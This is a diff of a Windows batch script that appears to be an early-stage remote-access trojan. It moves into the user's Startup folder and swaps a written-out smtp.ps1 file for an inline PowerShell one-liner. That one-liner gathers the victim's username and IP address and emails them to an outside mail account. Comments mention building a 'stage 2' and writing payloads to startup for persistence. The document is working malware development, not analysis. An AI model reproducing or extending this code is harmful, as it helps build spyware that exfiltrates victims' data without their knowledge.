@@ -10,16 +10,7 @@ set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 cd %STARTUP%
 
 @REM setup smtp
-(
-    echo $email = "novarat@mail.com"
-    echo $password = "password"
-    echo $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
-    echo $subject = "$env:UserName logs"
-    echo $smtp = New-Object System.Net.Mail.SmtpClient("smtp.mail.com", "587");
-    echo $smtp.EnableSSL = $true
-    echo $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
-    echo $smtp.Send($email, $email, $subject, $ip);
-) > smtp.ps1
+powershell $email = "novarat@mail.com"; $password = "password"; $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress | Out-String; $subject = "$env:UserName logs"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.mail.com", "587"); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password); $smtp.Send($email, $email, $subject, $ip);
 
 @REM TODO: build out stage 2
 @REM write payloads to startup
